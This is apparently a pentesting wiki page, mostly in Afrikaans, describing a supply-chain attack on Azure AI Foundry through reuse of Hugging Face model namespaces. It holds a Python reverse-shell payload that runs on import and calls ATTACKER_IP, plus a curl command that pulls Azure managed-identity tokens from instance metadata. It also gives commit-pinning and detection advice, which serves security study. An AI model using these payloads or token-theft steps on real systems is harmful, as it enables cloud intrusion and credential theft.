# Azure - AI Foundry Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Scenario

- Azure AI Foundry Model Catalog sluit baie Hugging Face (HF) modelle in vir een-klik ontplooiing.
- HF model identifiers are Author/ModelName. As 'n HF author/org verwyder word, kan enigiemand daardie author herregistreer en 'n model publiseer met dieselfde ModelName by die legacy path.
- Pipelines en catalogs wat slegs op naam trek (no commit pinning/integrity) sal oplos na attacker-controlled repos. Wanneer Azure die model ontplooi, kan loader code in die endpoint environment uitgevoer word, wat RCE gee met daardie endpoint se permissions.

Common HF takeover cases:
- Ownership deletion: Old path 404 until takeover.
- Ownership transfer: Old path 307 to the new author while old author exists. If the old author is later deleted and re-registered, the redirect breaks and the attacker’s repo serves at the legacy path.

## Identifying Reusable Namespaces (HF)
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## End-tot-end aanvalsvloei teen Azure AI Foundry

1) In die Model Catalog, vind HF-modelle wie se oorspronklike outeurs op HF verwyder of oorgedra is (ou outeur verwyder).
2) Herregistreer die verlate outeur op HF en skep die ModelName weer.
3) Publiseer 'n kwaadwillige repo met 'n loader-code wat by import uitgevoer word of trust_remote_code=True vereis.
4) Deploy die ou Author/ModelName vanaf Azure AI Foundry. Die platform trek die aanvaller se repo; die loader word binne die Azure endpoint container/VM uitgevoer, wat RCE met endpoint permissies lewer.

Voorbeeld payload-fragment wat by import uitgevoer word (slegs vir demonstrasie):
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Aantekeninge
- AI Foundry deployments wat HF integreer kloon gewoonlik en importeer repo modules wat in die model se config verwys (bv. auto_map), wat code execution kan veroorsaak. Sommige paaie vereis trust_remote_code=True.
- Toegang stem gewoonlik ooreen met die endpoint se managed identity/service principal permissions. Beskou dit as 'n initial access foothold vir data access en lateral movement binne Azure.

## Post-Exploitation Tips (Azure Endpoint)

- Enumereer omgewingsveranderlikes en MSI endpoints vir tokens:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- Kontroleer mounted storage, model artifacts, en bereikbare Azure-dienste met die verkrygde token.
- Oorweeg persistence deur poisoned model artifacts agter te laat as die platform weer vanaf HF re-pulls.

## Verdedigingsriglyne vir gebruikers van Azure AI Foundry

- Pin models by commit wanneer vanaf HF gelaai word:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Spieël geverifieerde HF-modelle na 'n betroubare interne register en implementeer daarvandaan.
- Skandeer deurlopend kodebasisse en defaults/docstrings/notebooks vir hard-coded Author/ModelName wat verwyder of oorgedra is; werk dit by of pin dit.
- Valideer die bestaan van die auteur en die herkoms van die model voor implementering.

## Herkenningsheuristieke (HTTP)

- Verwyderde auteur: auteurbladsy 404; legacy modelpad 404 totdat dit oorgeneem word.
- Oorgedra model: legacy-pad 307 na nuwe auteur terwyl die ou auteur bestaan; as die ou auteur later verwyder en weer geregistreer word, bedien die legacy-pad inhoud van 'n aanvaller.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Kruisverwysings

- Sien breër metodologie- en voorsieningskettingaantekeninge:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Verwysings

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
